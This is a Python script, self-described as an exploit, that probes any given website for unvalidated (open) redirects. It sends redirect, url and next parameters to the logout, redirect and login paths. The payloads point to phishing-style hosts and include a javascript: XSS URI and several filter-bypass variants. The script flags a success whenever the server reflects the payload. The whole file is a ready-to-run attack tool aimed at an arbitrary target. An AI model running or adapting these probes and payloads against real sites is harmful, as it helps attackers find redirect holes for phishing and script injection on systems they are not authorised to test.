#!/usr/bin/env python3

import requests
import sys

class UnvalidatedRedirectExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def test_redirect_parameter(self):
        print("[+] Testing unvalidated redirects via redirect parameter...")
        
        malicious_urls = [
            "http://evil.com",
            "https://malicious-site.com",
            "http://attacker.com/phishing",
            "javascript:alert('XSS')",
            "//evil.com",
            "\\\\evil.com",
            "http:evil.com",
            "https:evil.com"
        ]
        
        for url in malicious_urls:
            params = {'redirect': url}
            response = self.session.get(f"{self.target_url}/logout", params=params, allow_redirects=False)
            
            if response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                if url in location:
                    print(f"[SUCCESS] Unvalidated redirect to: {url}")
    
    def test_url_parameter(self):
        print("[+] Testing unvalidated redirects via url parameter...")
        
        test_urls = [
            "http://google.com",
            "https://github.com",
            "//attacker.com"
        ]
        
        for url in test_urls:
            params = {'url': url}
            response = self.session.get(f"{self.target_url}/redirect", params=params, allow_redirects=False)
            
            if response.status_code in [301, 302]:
                print(f"[SUCCESS] URL redirect to: {url}")
    
    def test_next_parameter(self):
        print("[+] Testing unvalidated redirects via next parameter...")
        
        next_urls = [
            "http://evil.com/login",
            "https://phishing-site.com",
            "/admin/../../../evil.com"
        ]
        
        for url in next_urls:
            params = {'next': url}
            response = self.session.get(f"{self.target_url}/login", params=params, allow_redirects=False)
            
            if response.status_code == 200 and url in response.text:
                print(f"[SUCCESS] Next parameter redirect: {url}")
    
    def run_all_tests(self):
        print("=" * 60)
        print("UNVALIDATED REDIRECTS TESTING")
        print("=" * 60)
        
        self.test_redirect_parameter()
        self.test_url_parameter()
        self.test_next_parameter()
        
        print("\n[INFO] Unvalidated redirects testing completed!")
 
def main():
    if len(sys.argv) != 2:
        print("Usage: python3 unvalidated_redirects.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1].rstrip('/')
    exploit = UnvalidatedRedirectExploit(target_url)
    exploit.run_all_tests()

if __name__ == "__main__":
    main()